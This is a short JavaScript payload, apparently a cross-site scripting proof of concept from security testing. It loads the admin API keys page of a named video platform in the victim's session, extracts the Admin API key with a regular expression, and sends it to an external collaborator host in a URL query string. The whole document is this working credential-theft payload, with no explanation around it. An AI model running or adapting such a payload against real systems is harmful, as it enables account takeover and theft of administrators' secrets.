fetch("https://admin.zype.com/api_keys").then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin<\/td>\s*<td>(\w+)<\/td>/);if (apiKeyMatch) {
      const apiKey = apiKeyMatch[1];
      return fetch("https://a1cm22cfoodep1a0l8a97eo3hunmbcz1.oastify.com?x=" + apiKey);
    } else {
      console.error("API Key not found in the response");
    }
  })
  .then(response => {
    console.log(response);
  });
